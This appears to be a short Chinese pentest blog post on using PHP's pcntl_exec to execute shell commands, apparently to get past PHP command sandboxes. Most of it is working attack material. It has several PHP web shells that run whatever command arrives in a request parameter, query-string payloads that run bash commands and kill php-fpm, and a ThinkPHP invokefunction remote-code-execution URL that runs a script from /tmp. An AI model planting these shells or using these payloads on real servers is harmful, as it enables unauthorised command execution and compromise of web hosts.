Title: pcntl_exec
Date: 2018-12-18
slug: pcntl_exec
Tag: Pentest


2019.8.1更新

这样子执行完就不会多出来<defunc>的进程，也不会多出来`php-fpm`进程:

```
<?php

/**
 * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
 */

//生成子进程
$cmd = $_REQUEST['cmd'];
$pid = pcntl_fork();
if($pid == -1){
    die('could not fork');
}else{
    if($pid){
        $status = 0;
        pcntl_exec($cmd[0], $cmd[1]);
        posix_kill(getmypid(),9);
//阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
        //可使用pcntl_wait($status, WNOHANG)实现非阻塞式

        pcntl_wait($status);
        exit;
    }
}
```

`cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm`

**执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)**



-----------------------------


```
参数执行:
pcntl_exec("/bin/bash",array("-c","id > 1.txt")) //返回值可能是502

执行脚本:
pcntl_exec("/tmp/script")   //返回值502
```

```
返回值200
<?php
$cmd = $_REQUEST['cmd'];
if(function_exists('pcntl_exec')) {
    switch(pcntl_fork()){
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo "case 111";
    }
} else {
        echo '不支持pcntl扩展';
}
?>


cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=id > /tmp/xxx.txt

/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=pcntl_exec&vars[1][0]=/bin/bash&vars[1][1][0]=/tmp/1.sh

```


```

<?php
header("Content-Type: text/plain");
$cmd="/tmp/exec";
@unlink($cmd);
@unlink("/tmp/output");
$c = "#!/usr/bin/env bash\nuname -a > /tmp/output\n";
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) {
  case 0:
    $ret = pcntl_exec($cmd);
    exit("case 0");
  default:
    echo "case 1";
    break;
}
```
上面执行的脚本那行chmod不可以少





* https://bugs.leavesongs.com/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/lnmp%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAphp%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/
